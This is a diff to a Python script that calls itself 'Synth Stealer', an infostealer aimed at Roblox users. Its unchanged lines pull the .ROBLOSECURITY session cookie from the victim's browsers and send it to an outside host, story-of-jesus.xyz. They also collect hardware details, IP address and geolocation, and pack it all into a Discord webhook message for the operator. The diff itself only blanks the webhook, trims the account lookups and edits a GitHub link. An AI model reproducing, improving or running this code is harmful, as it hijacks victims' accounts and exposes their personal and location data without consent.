@@ -17,7 +17,7 @@ except:
    os.system('pip install psutil')
    print("run again")
    time.sleep(5)
-webhook = 'WEBHOOK HERE'
+webhook = ''
 
 
 per_cpu = psutil.cpu_percent(percpu=True)
@@ -46,9 +46,6 @@ try:
    cookies = str(cookies)
    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
-   User = r['username']
-   rob = r['robux']
-   rap = r['rap']
 except:
    pass
 
@@ -57,9 +54,6 @@ try:
    cookies = str(cookies)
    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
-   User = r['username']
-   rob = r['robux']
-   rap = r['rap']
 except:
    pass
 
@@ -68,9 +62,6 @@ try:
    cookies = str(cookies)
    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
    r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
-   User = r['username']
-   rob = r['robux']
-   rap = r['rap']
 except:
    pass
 
@@ -89,11 +80,11 @@ lmaooo = {
                     "author": {
                         "name": f"Synth Stealer | {pcuser} ran Synth",
                     },
-                    "description": f"***PC INFO***\n*Machine > {mc}\nPC Version > {verse}\nSystem > {sys}\nProcessor > {proc}\nCPU Usage: > {usage}%*\n\n***RAM INFO***\nFree: > {mem_usage.percent}%\nTotal: > {mem_usage.total/(1024**3):.2f}G\nUsed: > {mem_usage.used/(1024**3):.2f}G*\n\n***IP INFO***\n*Ip > {ips}\ncity > {ct}\nRegion > {rn}\ncountry > {cy}\nhostname > {he}\nlang > {lg}\nPostal > {pt}\nTimezone > {tz}\nOrg > {org}*\n\n***ROBLOX INFO***\nUsername > `{User}`\nRobux > `{rob}`\nRap > `{rap}`\n*ROBLOX COOKIE* >```fix\n{cookie}```\n\n***DISCORD MODULES***\n*Injection: :white_check_mark: Coming soon..*",
+                    "description": f"***PC INFO***\n*Machine > {mc}\nPC Version > {verse}\nSystem > {sys}\nProcessor > {proc}\nCPU Usage: > {usage}%*\n\n***RAM INFO***\nFree: > {mem_usage.percent}%\nTotal: > {mem_usage.total/(1024**3):.2f}G\nUsed: > {mem_usage.used/(1024**3):.2f}G*\n\n***IP INFO***\n*Ip > {ips}\ncity > {ct}\nRegion > {rn}\ncountry > {cy}\nhostname > {he}\nlang > {lg}\nPostal > {pt}\nTimezone > {tz}\nOrg > {org}*\n\n***ROBLOX INFO***\n*ROBLOX COOKIE* >```fix\n{cookie}```\n\n***DISCORD MODULES***\n*Injection: :white_check_mark: Coming soon..*",
                     "color": 0x00C7FF,
                     
                     "footer": {
-                      "text": "Synth Stealer | synthetic#9270 | https://github.com/syntheticc/Synth-Stealer"
+                      "text": "Synth Stealer | synthetic#9270 | https://github.com/syntheticc/Synth"
                     }
                 }
             ]
